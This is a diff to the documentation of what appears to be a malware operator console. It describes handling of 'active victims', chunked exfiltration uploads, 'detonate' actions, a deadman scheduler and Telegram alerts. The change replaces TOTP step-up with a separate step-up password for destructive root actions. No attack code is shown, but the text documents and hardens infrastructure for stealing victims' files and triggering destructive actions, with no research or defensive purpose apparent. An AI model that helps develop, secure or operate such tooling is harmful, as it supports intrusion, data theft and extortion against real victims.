@@ -312,8 +312,10 @@ Operator console:
   assigned uniquely across active victims (deterministic reuse only when the pool
   is exhausted); exfil v1 carries a per-file `xfer` id so concurrent uploads for
   one victim cannot overwrite chunks; audit freeze now also covers reports,
-  exports, commands and exfil views; destructive root actions require TOTP
-  enrollment (`VEX_ALLOW_PASSWORD_STEPUP=1` is the lab-only password fallback).
+  exports, commands and exfil views; destructive root actions require a
+  separate 16-digit step-up password (PBKDF2 hash in the `stepup_pass_hash`
+  setting), not TOTP enrollment. The unlock lasts 5 minutes and is bound to
+  IP + user-agent.
 - **CSRF on every POST** (`SameSite=Lax` + per-session token), destructive
   actions are **POST-only** (`GET /admin/detonate/...` → 405).
 - **Accounts**: pbkdf2 200k, roles admin/viewer, **TOTP + single-use backup
@@ -348,8 +350,7 @@ Env: `VEX_PASS`, `VEX_DB`, `VEX_PRIV`, `VEX_SECRET`, `VEX_SECURE_COOKIE=1`,
 `VEX_TG_TOKEN`+`VEX_TG_CHAT`, `VEX_VCVARS` (explicit vcvars64 path),
 `PORT`, `VEX_THREADS`.
 `VEX_AUDIT_KEY` (HMAC key for signed audit snapshots; defaults to the session
-secret), `VEX_ALLOW_PASSWORD_STEPUP=1` (lab-only: allow password step-up when
-root/shadow has no TOTP), `VEX_NO_HOUSEKEEPING=1` (disable the schedule/deadman thread).
+secret), `VEX_NO_HOUSEKEEPING=1` (disable the schedule/deadman thread).
 `run_prod.py` refuses to start without `VEX_MASTER` (or `.master`);
 `VEX_ALLOW_PLAINTEXT=1` is the development escape.
 
